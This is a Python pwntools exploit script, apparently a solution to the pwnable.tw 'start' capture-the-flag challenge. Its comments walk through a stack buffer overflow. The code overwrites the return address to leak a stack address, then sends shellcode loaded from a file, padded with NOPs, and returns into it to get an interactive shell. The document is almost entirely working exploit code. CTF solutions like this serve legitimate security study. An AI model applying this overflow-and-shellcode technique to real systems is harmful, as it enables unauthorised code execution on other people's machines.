#!/usr/bin/env python3

from pwn import *

URL = "chall.pwnable.tw"
PORT = 10000

## local or remote

if len(sys.argv) >= 2 and sys.argv[1] == "remote":
    p = remote(URL, PORT)
else:
    p = process("./bin/start")


# The program write() info and then read() the user's message and then terminates.
# However, it contains a buffer overflow vulnerablity so that we can overwrite
# the return address and make it recursive.
# steps:
#   1) leak any stack address: compromise the size variable of write()
#   2) inject shellcode on stack and return to it
# buffer layout:
#      BUFFER_LEN = 0x14
#   | "Let's start the CTF" | <_exit> | saved_esp |
#   ^ecx                    ^retaddr    ^should leak this



# Step 1: return to _start and make the program write() again, also leak
#       a stack address. we can do it either by modifying the size variable of
#       the write() or moving the buffer address esp. However, the former limits
#       our ability to overflow futher.
#   | "aaaaaaaaaaaaaaaaaaa" | BEFORE_WRITE | saved_esp |
#                                                      ^ saved_esp points here


BEFORE_WRITE = 0x804808b
BUFFER_LEN = 0x14
return_to_write_again = b"a" * BUFFER_LEN + p32(BEFORE_WRITE)
p.recvuntil("Let's")
p.send(return_to_write_again)
p.recvuntil(p32(BEFORE_WRITE))
saved_esp_bytes = p.recvn(4)
saved_esp_addr = u32(saved_esp_bytes)
print(hex(u32(saved_esp_bytes)))

if len(sys.argv) >= 2 and sys.argv[1] == "debug":
    print("payload written")
    with open("payload", "wb") as out:
        out.write(return_to_write_again)
        out.close()


# Step 2: we will read() on the fixed address again, the buffer starts from
# ecx was orginally at 0x14 length but changed to 0x28 because in 0x8048099
# the esp was added twice. Since we don't change ecx, our shellcode can has
# it's maximum length 0x28
# layout (before):
#   | "aaaaaaaaaaaaaaaaaaa" | BEFORE_WRITE | saved_esp |
#   ^ ecx  BUFFER_LEN               4            4     ^
#
#  and the next return address will be:
#   | ---add %esp, 0x14 ----| prev. return | --- add %esp, 0x14 | curr. ret |
#           0x14                  4                    0x14
#
#  we will make it
#   | Shellcode ------------------------------------------------| ecx |

SPACE = BUFFER_LEN + 4 + BUFFER_LEN
ecx = saved_esp_addr - BUFFER_LEN - 4 - 4
with open("./shellcode/shellcode.bin", "rb") as f_sh:
    shellcode = f_sh.read()
    f_sh.close()
print(len(shellcode))
payload = shellcode + b'\x90'* (SPACE - len(shellcode)) + p32(ecx)
p.send(payload)
p.interactive()

